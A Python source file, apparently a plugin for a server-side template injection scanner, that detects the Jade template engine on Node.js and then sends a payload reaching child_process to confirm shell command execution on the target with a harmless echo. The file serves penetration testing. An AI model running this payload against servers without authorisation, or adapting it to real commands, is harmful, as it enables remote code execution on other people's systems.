from core.check import Check
from utils.loggers import log
from utils import rand
import string

class Jade(Check):
    
    def detect(self):
        
        # Declare payload
        self.base_tag = '= %s'
        
        self.req_header_rand = str(rand.randint_n(4))
        self.req_trailer_rand = str(rand.randint_n(4))
        
        # Skip reflection check if same tag has been detected before
        if self.get('reflect_tag') != self.base_tag:
            self._check_engine()
        
        self._check_engine()
    
        # Return if reflect_tag is not set
        if not self.get('reflect_tag'):
            return
            
        log.warn('Reflection detected')
        log.warn('Jade engine detected')

        # I've tested the techniques described in this article
        # http://blog.portswigger.net/2015/08/server-side-template-injection.html
        # for it didn't work. Still keeping the check active to cover previous
        # affected versions.

        self._check_os()
        
        if not self.get('exec'):
            return
            
        log.warn(
            'Shell command execution detected on \'%s\' operating system' % (
                self.get('os', 'undetected')
            )
        )

    def _check_engine(self):
        
        randA = rand.randint_n(1)
        randB = rand.randint_n(1)

        payload = '= %s*%s' % (randA, randB)
        expected = str(randA*randB)
        
        if expected == self.req(payload):
            self.set('reflect_tag', self.base_tag)
            self.set('language', 'nodejs')
            self.set('engine', 'jade')
                      
    def _check_os(self):
    
        expected_rand = str(rand.randint_n(2))
        
        payload = """- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('echo %s')""" % expected_rand
        
        if expected_rand == self.req(payload):
            self.set('exec', True)      
               

    def req(self, payload):
        
        rand_header = str(rand.randint_n(4))      
        rand_trailer = str(rand.randint_n(4))
        req_header = """\n= %s\n""" % (rand_header)
        req_trailer = """\n= %s\n""" % (rand_trailer)
        
        response = self.channel.req(req_header + payload + req_trailer)
        before,_,result = response.partition(rand_header)
        result,_,after = result.partition(rand_trailer)
        return result.strip()